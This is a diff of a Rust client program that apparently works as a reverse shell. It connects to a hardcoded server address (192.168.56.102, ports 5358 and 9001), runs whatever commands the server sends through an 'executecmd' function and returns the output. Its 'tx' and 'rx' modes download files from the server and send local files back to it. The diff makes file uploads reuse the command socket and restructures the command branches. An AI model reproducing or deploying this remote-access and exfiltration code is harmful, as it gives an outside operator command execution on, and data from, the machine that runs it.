@@ -109,30 +109,17 @@ use std::io::prelude::*;
 fn send_to_server(socket:&mut TcpStream, filename: & str) -> std::io::Result<()> {
     let file_path = Path::new(filename);
     let mut file = File::open(&file_path)?;
-    let mut contents = Vec::new();
-    file.read_to_end(&mut contents);
-    let mut socket = socket;
+    let metadata = file.metadata().unwrap();
+    let mut buffer = vec![0; metadata.len() as usize];
+    file.read_exact(&mut buffer)?;
+    socket.write_all(&buffer)?;
 
-    // Send file name
-    let filename = file_path.file_name().unwrap().to_str().unwrap();
-    let filename_bytes = filename.as_bytes();
-    let filename_len = filename_bytes.len();
-    socket.write_all(&filename_bytes)?;
-
-    println!(
-        "Sent filenm with {:?} bytes and contents: {}",
-        filename_bytes,
-        String::from_utf8_lossy(&filename_bytes)
-    );
-
-    // Send file contents
-    let contents_len = contents.len();
-    socket.write_all(&contents)?;
+    let contents_len = buffer.len();
 
     println!(
         "Sent file with {} bytes and contents: {}",
         contents_len,
-        String::from_utf8_lossy(&contents)
+        String::from_utf8_lossy(&buffer)
     );
     Ok(())
 }
@@ -198,7 +185,7 @@ pub async fn download_file(client: &Client, url: &str, path: &str) -> Result<(),
 #[tokio::main]
 async fn main() {
     // set ip address and port here
-    let mut ipaddy = "172.25.32.1".to_string();
+    let mut ipaddy = "192.168.56.102".to_string();
     let port = "5358".to_string();
     let port2 = "9001".to_string(); // for tx and rx of files
     
@@ -237,7 +224,7 @@ async fn main() {
             println!("Files downloaded...");
         }
 
-        if &text=="tx"{ //downloading from server 
+        else if &text=="tx"{ //downloading from server 
             let mut buffer:Vec<u8> = Vec::new();
             let mut reader = BufReader::new(&client);
             reader.read_until(b'\0', &mut buffer);
@@ -251,7 +238,7 @@ async fn main() {
             println!("Files downloaded...");
         }
 
-        if &text=="rx"{ //uploading to server 
+        else if &text=="rx"{ //uploading to server 
             let mut buffer:Vec<u8> = Vec::new();
             let mut reader = BufReader::new(&client);
             reader.read_until(b'\0', &mut buffer);
@@ -263,13 +250,14 @@ async fn main() {
             println!("reciever from server in rx mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
             let fnpath : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
             println!("sending files...");
-            send_to_server(&mut TcpStream::connect(serveraddresstx.to_string()).unwrap(), &fntext);
+            send_to_server(&mut client, &fntext);
             println!("sent to server...");
         }
-        
-        let mut output =executecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
-        output.push('\0');
-        client.write(&mut output.as_bytes());
+        else {
+            let mut output =executecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
+            output.push('\0');
+            client.write(&mut output.as_bytes());
+        }
     }
     client.shutdown(Shutdown::Both);
 }
